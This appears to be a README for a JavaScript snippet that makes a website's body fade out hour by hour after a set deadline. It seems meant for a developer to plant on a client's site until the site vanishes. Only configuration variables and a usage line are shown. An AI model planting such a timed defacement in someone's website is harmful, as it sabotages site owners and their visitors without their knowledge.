Add opacity to the body tag and increase it every hour until their site completely fades away. Set a hours_date and customize the number of hours you offer them until the website is fully vanished. 


```javascript
/* change these variables as you wish */
	var hours_date = 1549479538; // Unix timestamp of date you want body to vanish
	var hours_deadline = 4; // Hourly time difference between current hour and unix timestamp date
/* stop changing here */
```

## Usage
Just load the .js file in ```<head>```
